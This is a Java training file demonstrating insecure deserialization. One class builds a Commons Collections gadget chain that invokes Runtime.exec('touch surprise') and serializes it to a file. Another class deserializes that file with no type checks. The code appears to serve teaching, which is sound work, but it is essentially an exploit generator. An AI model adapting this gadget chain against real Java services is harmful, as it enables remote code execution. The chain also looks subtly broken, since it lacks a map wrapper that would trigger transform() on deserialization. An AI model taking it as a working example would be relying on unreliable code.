package victor.training.spring.security.vulnerability;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

public class InsecureDeserialization {

  public static final String FILE_NAME = "instance.dat";

  public static class Read {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
//      Runtime.getRuntime().exec("touch surprise");
      try (ObjectInputStream oos = new ObjectInputStream(new FileInputStream(FILE_NAME))) {
        Object o = oos.readObject();
        ExpectedClass e = (ExpectedClass) o;
        System.out.println("Got : " + e);
      }
    }
  }

  public static class Generate {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
      // Create a map containing the vulnerable class
      Map<String, Object> map = new HashMap<String, Object>();
      map.put("value", "value");
      map.put("key", "key");
      // Create a Transformer that calls the 'getRuntime' method
      Transformer[] transformers = {
          new ConstantTransformer(Runtime.class),
          new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
          new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
          new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"touch surprise"})
      };
      Transformer chainedTransformer = new ChainedTransformer(transformers);
      Map<String, Object> map2 = new HashMap<>();
      map2.put("value", Collections.singletonMap("value", chainedTransformer));
      // Create the payload and serialize it
      Map<String, Object> payload = new HashMap<>();
      payload.put("key", map2);

      ByteArrayOutputStream baos = new ByteArrayOutputStream();
      try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
        oos.writeObject(payload);
      }

      IOUtils.write(baos.toByteArray(), new FileOutputStream(FILE_NAME));
    }


  }

  public static class ExpectedClass {
    private int data;

    public int getData() {
      return data;
    }

    public void setData(int data) {
      this.data = data;
    }
  }
}

